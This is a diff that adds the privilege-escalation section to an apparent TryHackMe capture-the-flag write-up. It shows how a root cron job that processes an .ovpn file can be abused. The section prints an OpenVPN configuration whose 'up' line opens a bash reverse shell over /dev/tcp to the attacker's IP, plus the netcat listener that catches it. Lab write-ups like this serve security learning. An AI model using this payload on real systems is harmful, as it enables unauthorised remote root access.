@@ -81,4 +81,31 @@ Reverse to base64 and decode `echo "=kzcHJl[...]mV" | rev | base64 -d` to get a 
 
 
 Success! We got user.
+
 ![user](images/ssh.png)
+
+## Privilege escalation
+
+We see that there is an empty `*.ovpn` configration file in the user's home directory.
+
+Further observe the last cron job in `/etc/crontab` executes `run.sh` in the root folder.
+
+![cron](images/cron.png) 
+
+The empty `.ovpn` file seems really weird, and might be a hint that the `run.sh` has something to do with it. After some research I found ![this article](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) that shows how you can get a reverse shell with this configuration
+```
+remote <Your THM ip>
+dev tun
+nobind
+script-security 2
+up "/bin/bash -c '/bin/bash -i > /dev/tcp/<Your THM ip>/8181 0<&1 2>&1&'"
+```
+
+The commands that follows `up` gets executed, and that gives us reverse shell. Write to the configuration file, and use netcat to listen for incoming connections.
+
+Write the configuration above to the `tryhackme.ovpn` file, and wait for the cron job to run again at port `8181`.
+ `nc -v -n -l -p 8181`
+
+ ![root](images/root.png)
+
+ Rooted! :^)
